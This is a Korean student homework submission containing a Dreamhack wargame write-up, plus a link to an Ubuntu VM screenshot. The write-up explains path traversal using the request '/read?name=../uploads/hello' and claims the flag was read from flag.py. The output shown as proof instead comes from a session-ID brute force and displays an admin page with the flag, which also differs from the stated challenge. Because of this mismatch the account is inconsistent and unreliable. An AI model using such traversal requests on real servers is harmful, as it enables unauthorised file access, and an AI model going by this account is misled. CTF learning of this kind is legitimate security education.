#5주차 과제 제출 창입니다.

풀이한 워게임 라이트업과 vm 우분투 설치 화면을 캡쳐하여 올려주세요.
vm 우분투 설치
<img width="1920" height="1080" alt="Image" src="https://github.com/user-attachments/assets/4a684eec-22b9-4212-abd3-590734c3f739" />

드림핵 워게임
> 일반 계정으로 로그인한 상태에서 권한 검증 로직의 허점을 이용하여
> 오직 관리자(admin)만 볼 수 있는 메뉴나 페이지에 접근하는 문제

1. 취약점 개요
취약점 명칭: 경로 조작 / 디렉토리 탈출 (Path Traversal / Directory Traversal)

발생 원인: 사용자 입력값(name 파라미터)에 대한 적절한 필터링이나 검증 없이 파일 경로 생성을 처리하여, 공격자가 상위 디렉토리로 이동할 수 있는 구조적 결함이 존재함.

2. 취약점 분석 및 검증 (PoC)
🔹 1단계: 테스트 파일 업로드
취약점 여부를 안전하게 확인하기 위해 hello라는 이름의 테스트 파일을 먼저 업로드함. 서버는 내부적으로 uploads/hello 경로에 파일을 저장할 것으로 예상됨.
🔹 2단계: 디렉토리 탈출 
테스트파일 읽기 기능 기능에서 상위 디렉토리 이동 문자열(../)이 필터링되는지 확인하기 위해 아래와 같이 조작된 요청을 전송함.
- 공격 요청: /read?name=../uploads/hello
- 서버 내부 동작 예상: uploads/../uploads/hello $\rightarrow$ 결과적으로 uploads/hello 경로를 가리킴.
- 결과: hello 파일의 내용이 정상적으로 출력됨을 확인. 즉, ../ 특수문자가 차단되지 않고 시스템 경로로 그대로 해석됨.

3. 익스플로잇 (Flag 획득)
디렉토리 탈출이 가능함을 확인했으므로, 구동 중인 소스 코드나 환경 설정 상 웹 루트 상위에 존재하는 중요 파일(flag.py)에 접근을 시도함.

[+] 성공했습니다! 올바른 세션 ID: fa
----------------------------------------
<!doctype html>
<html>
  <head>
    <link rel="stylesheet" href="/static/css/bootstrap.min.css">
    <link rel="stylesheet" href="/static/css/bootstrap-theme.min.css">
    <link rel="stylesheet" href="/static/css/non-responsive.css">
    <title>Index Session</title>
    
  
  <style type="text/css">
    .important { color: #336699; }
  </style>

  </head>
<body>

    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Session</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="#">About</a></li>
          </ul>

          <ul class="nav navbar-nav navbar-right">
            <li><a href="/login">Login</a></li>
          </ul>

        </div><!--/.nav-collapse -->
      </div>
    </nav>
    <!-- 
      # default account: guest/guest
    -->
    <div class="container">
      
  <p class="important">
        Welcome !
  </p>
  
  <h3>
        Hello admin, flag is DH{73b3a0ebf47fd6f68ce623853c1d4f138ad91712}

  </h3>
  

    </div> <!-- /container -->

    <!-- Bootstrap core JavaScript -->
    <script src="/static/js/jquery.min.js"></script>
    <script src="/static/js/bootstrap.min.js"></script> 
</body>
</html>
----------------------------------------

<img width="1624" height="900" alt="Image" src="https://github.com/user-attachments/assets/e78d3d0d-0662-49ef-8b1d-dc1cfbffe2ce" />